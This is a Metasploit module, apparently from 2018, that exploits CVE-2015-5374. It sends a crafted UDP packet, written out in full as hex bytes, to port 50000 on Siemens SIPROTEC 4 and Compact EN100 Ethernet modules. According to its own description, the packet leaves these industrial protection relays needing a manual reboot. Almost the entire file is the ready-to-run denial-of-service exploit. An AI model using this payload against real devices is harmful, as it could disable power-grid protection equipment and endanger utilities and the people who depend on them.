##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
 
require 'msf/core'
 
class MetasploitModule < Msf::Auxiliary
 
    include Msf::Exploit::Remote::Udp
    include Msf::Auxiliary::Dos
    def initialize(info = {})
        super(update_info(info, 
            'Name'           => 'Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module < V4.25 - Denial of Service ',
            'Description'    => %q{
                This module sends a specially crafted packet to port 50000/UDP 
                causing a denial of service of the affected (Siemens SIPROTEC 4 and SIPROTEC Compact) devices. 
                A manual reboot is required to return the device to service. 
                CVE-2015-5374 and a CVSS v2 base score of 7.8 have been assigned to this vulnerability.
                
            },
            'Author'         => [ 'M. Can Kurnaz' ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: 1 $',
            'References'     =>
                [
                    [ 'CVE' '2015-5374' ],
                    [ 'URL', 'https://www.exploit-db.com/exploits/44103/' ],
                    [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01' ]
                ]))
             
            register_options([Opt::RPORT(50000),], self.class)
    end
 
    def run
        connect_udp
        pckt = "\x11\x49\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x9e"
         
        print_status("Sending DoS packet ... ")
         
        udp_sock.put(pckt)
         
        disconnect_udp
    end
 
end
 
# 0x43414e [2018-03-08]
